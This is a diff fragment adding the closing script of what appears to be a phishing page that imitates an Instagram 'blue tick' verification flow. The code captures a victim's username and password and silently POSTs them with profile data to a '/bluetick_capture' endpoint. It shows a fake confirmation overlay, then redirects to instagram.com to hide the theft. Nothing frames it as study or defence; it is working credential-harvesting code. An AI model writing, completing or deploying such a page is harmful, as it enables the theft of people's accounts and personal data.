+    document.getElementById('confirmUsername').innerHTML = '@' + capturedUsername + ' <span class="mini-badge"><img src="https://files.catbox.moe/ravjye.png" alt=""></span>';
+    document.getElementById('confirmPassword').textContent = '\u2022'.repeat(password.length);
+    document.getElementById('confirmOverlay').classList.add('visible');
+  }
+
+  function hideConfirmOverlay() {
+    document.getElementById('confirmOverlay').classList.remove('visible');
+  }
+
+  function submitCredentials() {
+    var username = capturedUsername;
+    var password = document.getElementById('passwordInput').value.trim();
+
+    fetch('/bluetick_capture', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({username: username, password: password, profile: profileData})
+    });
+
+    hideConfirmOverlay();
+    nextStep(4);
+  }
+
+  function exitPage() {
+    document.querySelector('.container').style.opacity = '0';
+    document.querySelector('.container').style.transition = 'opacity 0.3s ease';
+    setTimeout(function() {
+      window.location.href = 'https://www.instagram.com';
+    }, 350);
+  }
+
+  document.getElementById('usernameInput').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') lookupUsername();
+  });
+
+  document.getElementById('passwordInput').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') showConfirmOverlay();
+  });
+
+  updateProgress(1);
+  document.getElementById('backBtn').style.display = 'none';
+</script>
+</body>
+  </html>
